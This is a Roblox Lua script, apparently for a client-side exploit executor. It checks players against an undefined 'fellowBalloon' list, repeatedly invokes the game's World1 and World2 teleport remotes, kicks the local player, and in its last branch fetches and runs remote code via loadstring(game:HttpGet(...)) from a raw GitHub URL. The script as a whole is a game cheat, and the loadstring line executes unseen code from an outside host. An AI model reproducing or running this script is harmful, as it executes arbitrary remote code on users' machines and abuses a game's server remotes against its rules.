local RepStor = game:GetService("ReplicatedStorage")
local Net = RepStor.Network

-- Get the Players service
local Players = game:GetService("Players")
local playerCount = #Players:GetPlayers()


local function checkServer()
	local isPserver = false
	for _, player in ipairs(Players:GetPlayers()) do
		local tempName = player.Name
		isPserver = false  -- Reset for each player

		for _, users in pairs(fellowBalloon) do
			if tempName == users then
				isPserver = true
				break  -- Stop checking other names in fellowBalloon once a match is found
			end
		end
		
		if isPserver then 
			break  -- Stop checking other players once we know it's a private server
		end
	end
	return isPserver
end

isPrivate = checkServer()

if isPrivate and game.PlaceId == 8737899170 then
	while game.PlaceId do
		 Net.World2Teleport:InvokeServer() task.wait(5)
	end
elseif game.PlaceId == 16498369169 and #game:GetService("Players"):GetChildren() > 1 then
	while game.PlaceId do
		Net.World1Teleport:InvokeServer() task.wait(5)
	end
elseif not isPrivate and game.PlaceId == 8737899170 then
	game.Players.LocalPlayer:Kick("You have been kicked.")
elseif game.PlaceId == 16498369169 and #game:GetService("Players"):GetChildren() == 1 then
	print("Loadstring to balloon here")
	loadstring(game:HttpGet("https://raw.githubusercontent.com/jihyookuma/ps99/main/ktybackup"))()
end
 
